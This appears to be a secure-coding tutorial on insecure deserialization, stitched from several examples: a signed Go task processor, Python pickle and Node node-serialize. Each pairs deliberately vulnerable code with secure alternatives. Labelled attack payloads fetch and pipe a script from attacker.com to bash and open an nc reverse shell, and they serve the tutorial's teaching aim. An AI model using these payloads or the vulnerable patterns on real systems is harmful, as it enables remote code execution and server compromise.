}

// Validate task type against strict allowlist
var allowedTaskTypes = map[string]bool{
	"compute":    true,
	"transform":  true,
	"aggregate":  true,
}

func (t *SafeTask) Validate() error {
	if t.ID == "" || len(t.ID) > 64 {
		return errors.New("invalid task ID")
	}
	if !allowedTaskTypes[t.TaskType] {
		return fmt.Errorf("unknown task type: %s", t.TaskType)
	}
	if len(t.Payload) > 100*1024 {
		return errors.New("task payload too large")
	}
	return nil
}

// ===============================================
// LAYER 3: Isolated Processing with Context
// ===============================================

type TaskProcessor struct {
	serializer *SecureSerializer
	handlers   map[string]TaskHandler
}

type TaskHandler func(ctx context.Context, payload []byte) (*SafeResult, error)

func NewTaskProcessor(key []byte) *TaskProcessor {
	return &TaskProcessor{
		serializer: NewSecureSerializer(key),
		handlers:   make(map[string]TaskHandler),
	}
}

func (p *TaskProcessor) RegisterHandler(taskType string, handler TaskHandler) {
	if !allowedTaskTypes[taskType] {
		panic("cannot register handler for unknown task type")
	}
	p.handlers[taskType] = handler
}

func (p *TaskProcessor) ProcessTask(ctx context.Context, raw []byte) (*SafeResult, error) {
	// Timeout context for processing
	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	var task SafeTask
	if err := p.serializer.Deserialize(raw, &task); err != nil {
		return nil, fmt.Errorf("deserialization failed: %w", err)
	}

	// Post-deserialization validation
	if err := task.Validate(); err != nil {
		return nil, fmt.Errorf("validation failed: %w", err)
	}

	handler, ok := p.handlers[task.TaskType]
	if !ok {
		return nil, fmt.Errorf("no handler for task type: %s", task.TaskType)
	}

	// Execute with context for cancellation
	return handler(ctx, task.Payload)
}

// ===============================================
// LAYER 4: HTTP Handler with Full Protection
// ===============================================

func (p *TaskProcessor) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	// Only accept POST
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Strict content type
	if r.Header.Get("Content-Type") != "application/octet-stream" {
		http.Error(w, "Invalid content type", http.StatusBadRequest)
		return
	}

	// Size limit
	r.Body = http.MaxBytesReader(w, r.Body, maxPayloadBytes+2048)

	raw, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read request", http.StatusBadRequest)
		return
	}

	result, err := p.ProcessTask(r.Context(), raw)
	if err != nil {
		log.Printf("Task processing failed from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Processing failed", http.StatusBadRequest)
		return
	}

	response, err := p.serializer.Serialize(result)
	if err != nil {
		log.Printf("Response serialization failed: %v", err)
		http.Error(w, "Internal error", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(response)
}

func main() {
	// In production, load from secure secret management
	key := []byte("your-32-byte-minimum-secret-key!")

	processor := NewTaskProcessor(key)

	// Register safe handlers only
	processor.RegisterHandler("compute", func(ctx context.Context, payload []byte) (*SafeResult, error) {
		// Safe computation, no shell execution
		return &SafeResult{
			Status:      "completed",
			Output:      []byte("result"),
			CompletedAt: time.Now(),
		}, nil
	})

	log.Println("Starting secure task processor on :8080")
	log.Fatal(http.ListenAndServe(":8080", processor))
}
```

**Defense in Depth Layers**:

1. **Cryptographic Integrity (HMAC-SHA256)**:
```go
// Verify signature BEFORE any deserialization
if !s.verify(payload.Data, payload.Signature) {
    return errors.New("signature verification failed")
}
```
Attacker cannot craft malicious payloads without the secret key.

2. **Temporal Validation**:
```go
age := time.Since(time.Unix(payload.Timestamp, 0))
if age > maxPayloadAge || age < -30*time.Second {
    return errors.New("payload expired")
}
```
Prevents replay attacks with captured valid payloads.

3. **Strict Type Allowlist**:
```go
var allowedTaskTypes = map[string]bool{
    "compute":   true,
    "transform": true,
}
// Handler dispatch only for pre-registered safe types
handler, ok := p.handlers[task.TaskType]
```
No dynamic type instantiation, explicit handler mapping.

**Additional Protections**:
- **Never use gob with untrusted data**: Only use for internal signed messages between trusted components
- **Consider alternatives**: Protocol Buffers or Cap'n Proto provide schema-based serialization without arbitrary code execution risks
- **Memory limits**: Use `io.LimitReader` and `MaxBytesReader` to prevent resource exhaustion
- **Context timeouts**: Always process with deadline context to prevent hanging on malformed data
- **Audit logging**: Log all deserialization failures with source IP for threat detection
- **Key rotation**: Implement HMAC key rotation with grace period for both old and new keys

Using `pickle` to deserialize untrusted data is **extremely dangerous** and can lead to remote code execution. This vulnerability class has affected major projects including PyTorch (CVE-2024-5480), where malicious model files could execute arbitrary code.

**VULNERABLE CODE**:

```python
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

# DANGEROUS: Deserializing user-controlled data
@app.route('/api/cache/load', methods=['POST'])
def load_cached_data():
    encoded_data = request.json.get('data')

    # CRITICAL VULNERABILITY: pickle.loads on untrusted data
    serialized = base64.b64decode(encoded_data)
    cached_object = pickle.loads(serialized)  # RCE HERE!

    return {'result': str(cached_object)}

@app.route('/api/session/restore', methods=['POST'])
def restore_session():
    session_data = request.cookies.get('session_state')

    # VULNERABLE: Loading pickled session from cookie
    user_session = pickle.loads(base64.b64decode(session_data))
    return {'user': user_session.get('username')}

if __name__ == '__main__':
    app.run()
```

**Attack Payload** - Crafting a malicious pickle:
```python
import pickle
import base64
import os

class MaliciousPayload:
    def __reduce__(self):
        # This executes when unpickled!
        return (os.system, ('curl https://attacker.com/shell.sh | bash',))

# Generate the malicious payload
malicious = pickle.dumps(MaliciousPayload())
encoded_payload = base64.b64encode(malicious).decode()
print(f"Attack payload: {encoded_payload}")
# Send this as the 'data' parameter to execute arbitrary commands
```

**Why This Is Dangerous**:
- `pickle.loads()` executes arbitrary Python code during deserialization via `__reduce__` method
- Attackers can execute system commands, establish reverse shells, or exfiltrate data
- No authentication or validation can make pickle safe for untrusted data
- The vulnerability exists regardless of transport encryption (HTTPS doesn't help)

**SECURE VERSION**:

```python
import json
import hmac
import hashlib
from flask import Flask, request, abort
from typing import Any, Dict, Optional
import logging

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-from-env'  # Load from environment

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# SECURE: Use JSON for serialization (data-only, no code execution)
ALLOWED_TYPES = (str, int, float, bool, list, dict, type(None))

def validate_json_structure(data: Any, max_depth: int = 10) -> bool:
    """Recursively validate that data contains only safe types."""
    if max_depth <= 0:
        return False

    if isinstance(data, dict):
        return all(
            isinstance(k, str) and validate_json_structure(v, max_depth - 1)
            for k, v in data.items()
        )
    elif isinstance(data, list):
        return all(validate_json_structure(item, max_depth - 1) for item in data)
    else:
        return isinstance(data, ALLOWED_TYPES)

def sign_data(data: str) -> str:
    """Create HMAC signature for data integrity."""
    return hmac.new(
        app.config['SECRET_KEY'].encode(),
        data.encode(),
        hashlib.sha256
    ).hexdigest()

def verify_signature(data: str, signature: str) -> bool:
    """Verify HMAC signature using constant-time comparison."""
    expected = sign_data(data)
    return hmac.compare_digest(expected, signature)

@app.route('/api/cache/load', methods=['POST'])
def load_cached_data():
    try:
        payload = request.json
        if not payload:
            abort(400, 'Missing request body')

        data = payload.get('data')
        signature = payload.get('signature')

        if not data or not signature:
            abort(400, 'Missing data or signature')

        # SECURITY: Verify integrity before processing
        if not verify_signature(data, signature):
            logger.warning(f"Invalid signature from {request.remote_addr}")
            abort(403, 'Invalid signature')

        # SECURE: Parse as JSON (no code execution)
        cached_object = json.loads(data)

        # DEFENSE IN DEPTH: Validate structure
        if not validate_json_structure(cached_object):
            logger.warning(f"Invalid data structure from {request.remote_addr}")
            abort(400, 'Invalid data structure')

        return {'result': cached_object}

    except json.JSONDecodeError:
        abort(400, 'Invalid JSON')
    except Exception as e:
        logger.error(f"Cache load error: {e}")
        abort(500, 'Internal error')

if __name__ == '__main__':
    app.run()
```

**Key Security Controls**:
- **JSON instead of pickle**: JSON is a data-only format that cannot execute code during parsing
- **HMAC signatures**: Ensures data hasn't been tampered with; only server can create valid signatures
- **Structure validation**: Limits data to known safe types and prevents deeply nested attacks
- **Constant-time comparison**: Uses `hmac.compare_digest()` to prevent timing attacks on signatures

Using libraries like `node-serialize` or `serialize-javascript` without proper safeguards is extremely dangerous and can lead to Remote Code Execution (RCE). This vulnerability was widely exploited after CVE-2017-5941 and continues to affect applications in 2023-2024.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());
app.use(express.json());

// VULNERABLE: Deserializing untrusted data
app.get('/profile', (req, res) => {
  const sessionCookie = req.cookies.session;

  if (sessionCookie) {
    // DANGEROUS: Unserializing data from user-controlled cookie
    const sessionData = serialize.unserialize(sessionCookie);

    res.json({
      username: sessionData.username,
      preferences: sessionData.preferences
    });
  } else {
    res.status(401).json({ error: 'No session found' });
  }
});

// VULNERABLE: Storing serialized user input
app.post('/login', (req, res) => {
  const { username, preferences } = req.body;

  const sessionData = serialize.serialize({
    username: username,
    preferences: preferences,
    loginTime: Date.now()
  });

  res.cookie('session', sessionData);
  res.json({ message: 'Logged in successfully' });
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized payload with IIFE for RCE
{"username":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash')}()"}

// Alternative reverse shell payload
{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('nc -e /bin/bash attacker.com 4444')}()"}
```

**Why This Is Dangerous**:
- `node-serialize` evaluates JavaScript functions during deserialization
- The `_$$ND_FUNC$$_` prefix tells the library to execute the following as a function
- Adding `()` at the end creates an IIFE that runs immediately upon deserialization
- Attacker gains full code execution with the privileges of the Node.js process
- Can lead to complete server compromise, data theft, ransomware deployment

**SECURE VERSION**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');
const Joi = require('joi');

const app = express();
app.use(cookieParser());
app.use(express.json());

const JWT_SECRET = process.env.JWT_SECRET || 'your-256-bit-secret';
const JWT_EXPIRY = '1h';

// Schema validation for session data
const sessionSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  preferences: Joi.object({
    theme: Joi.string().valid('light', 'dark').default('light'),
    language: Joi.string().valid('en', 'es', 'fr').default('en')
  }).default({}),
  iat: Joi.number(),
  exp: Joi.number()
});

// SECURE: Using JWT instead of serialization
app.get('/profile', (req, res) => {
  const token = req.cookies.session;

  if (!token) {
    return res.status(401).json({ error: 'No session found' });
  }

  try {
    // Verify and decode JWT (safe - no code execution)
    const decoded = jwt.verify(token, JWT_SECRET, {
      algorithms: ['HS256'] // Explicitly specify allowed algorithms
    });

    // Validate the decoded data structure
    const { error, value } = sessionSchema.validate(decoded);
    if (error) {
      console.warn('Invalid session data structure:', error.message);
      return res.status(400).json({ error: 'Invalid session data' });
    }

    res.json({
      username: value.username,
      preferences: value.preferences
    });
  } catch (err) {
    console.error('JWT verification failed:', err.message);
    res.clearCookie('session');
    res.status(401).json({ error: 'Invalid session' });
  }
});

// SECURE: Creating signed JWT tokens
app.post('/login', (req, res) => {
  const { username, preferences } = req.body;

  // Validate input before creating token
  const { error, value } = sessionSchema.validate({ username, preferences });
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }

  const token = jwt.sign(
    {
      username: value.username,
      preferences: value.preferences
    },
    JWT_SECRET,
    { expiresIn: JWT_EXPIRY, algorithm: 'HS256' }
  );

  res.cookie('session', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 3600000 // 1 hour
  });

  res.json({ message: 'Logged in successfully' });
});

app.listen(3000);
```

**Key Security Controls**:
- **JWT instead of serialization**: JWTs are signed and verified, not executed as code
- **Schema validation with Joi**: Ensures data structure matches expected format before use
- **Algorithm pinning**: Explicitly specifying `HS256` prevents algorithm confusion attacks
- **Secure cookie settings**: `httpOnly`, `secure`, and `sameSite` flags protect the token
- **Input validation**: All user input validated before token creation

For complex object serialization with custom types, you need a whitelist-based approach that explicitly defines how each type is serialized and deserialized without executing arbitrary code. Here's a production-ready pattern:

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const crypto = require('crypto');
const Joi = require('joi');

const app = express();
app.use(express.json());

// Define allowed types with explicit serializers/deserializers
class SafeSerializer {
  constructor(secret) {
    this.secret = secret;
    this.typeRegistry = new Map();
    this.maxDepth = 10;
    this.maxSize = 1024 * 1024; // 1MB limit
  }

  // Register allowed types with explicit conversion functions
  registerType(typeName, validator, serializer, deserializer) {
    if (typeof typeName !== 'string' || typeName.length > 50) {
      throw new Error('Invalid type name');
    }
    this.typeRegistry.set(typeName, {
      validator,      // Joi schema or validation function
      serializer,     // Converts instance to plain object
      deserializer    // Converts plain object to instance (NO eval)
    });
  }

  serialize(obj, depth = 0) {
    if (depth > this.maxDepth) {
      throw new Error('Maximum serialization depth exceeded');
    }

    const serialized = this._serializeValue(obj, depth);
    const jsonString = JSON.stringify(serialized);

    if (jsonString.length > this.maxSize) {
      throw new Error('Serialized data exceeds maximum size');
    }

    // Add HMAC signature for integrity verification
    const hmac = crypto.createHmac('sha256', this.secret);
    hmac.update(jsonString);
    const signature = hmac.digest('hex');

    return JSON.stringify({
      data: serialized,
      sig: signature,
      v: 1 // Version for future compatibility
    });
  }

  _serializeValue(value, depth) {
    if (value === null || value === undefined) return value;
    if (typeof value === 'string' || typeof value === 'number' || typeof value === 'boolean') {
      return value;
    }
    if (value instanceof Date) {
      return { __type: 'Date', value: value.toISOString() };
    }
    if (Array.isArray(value)) {
      return value.map(item => this._serializeValue(item, depth + 1));
    }
    if (typeof value === 'object') {
      const typeName = value.constructor?.name;
      const typeHandler = this.typeRegistry.get(typeName);

      if (typeHandler) {
        const serialized = typeHandler.serializer(value);
        return { __type: typeName, value: serialized };
      }

      // Plain object - recursively serialize
      const result = {};
      for (const [key, val] of Object.entries(value)) {
        // Reject keys that could be exploited
        if (key.startsWith('__proto__') || key === 'constructor' || key === 'prototype') {
          throw new Error(`Forbidden key: ${key}`);
        }
        result[key] = this._serializeValue(val, depth + 1);
      }
      return result;
    }
    throw new Error(`Cannot serialize type: ${typeof value}`);
  }

  deserialize(serializedString) {
    let envelope;
    try {
      envelope = JSON.parse(serializedString);
    } catch (e) {
      throw new Error('Invalid serialized data format');
    }

    if (!envelope || typeof envelope !== 'object' || !envelope.data || !envelope.sig) {
      throw new Error('Missing required envelope fields');
    }

    // Verify HMAC signature BEFORE processing
    const hmac = crypto.createHmac('sha256', this.secret);
    hmac.update(JSON.stringify(envelope.data));
    const expectedSig = hmac.digest('hex');

    if (!crypto.timingSafeEqual(Buffer.from(envelope.sig), Buffer.from(expectedSig))) {
      throw new Error('Signature verification failed - data may be tampered');
    }

    return this._deserializeValue(envelope.data, 0);
  }

  _deserializeValue(value, depth) {
    if (depth > this.maxDepth) {
      throw new Error('Maximum deserialization depth exceeded');
    }
    if (value === null || value === undefined) return value;
    if (typeof value === 'string' || typeof value === 'number' || typeof value === 'boolean') {
      return value;
    }
    if (Array.isArray(value)) {
      return value.map(item => this._deserializeValue(item, depth + 1));
    }
    if (typeof value === 'object') {
      // Handle typed objects
      if (value.__type) {
        if (value.__type === 'Date') {
          const date = new Date(value.value);
          if (isNaN(date.getTime())) throw new Error('Invalid date');
          return date;
        }

        const typeHandler = this.typeRegistry.get(value.__type);
        if (!typeHandler) {
          throw new Error(`Unknown type: ${value.__type}`);
        }

        // Validate before deserializing
        const validation = typeHandler.validator.validate(value.value);
        if (validation.error) {
          throw new Error(`Validation failed for ${value.__type}: ${validation.error.message}`);
        }

        return typeHandler.deserializer(validation.value);
      }

      // Plain object
      const result = {};
      for (const [key, val] of Object.entries(value)) {
        if (key.startsWith('__proto__') || key === 'constructor' || key === 'prototype') {
          continue; // Skip dangerous keys
        }
        result[key] = this._deserializeValue(val, depth + 1);
      }
      return result;
    }
    throw new Error(`Cannot deserialize type: ${typeof value}`);
  }
}

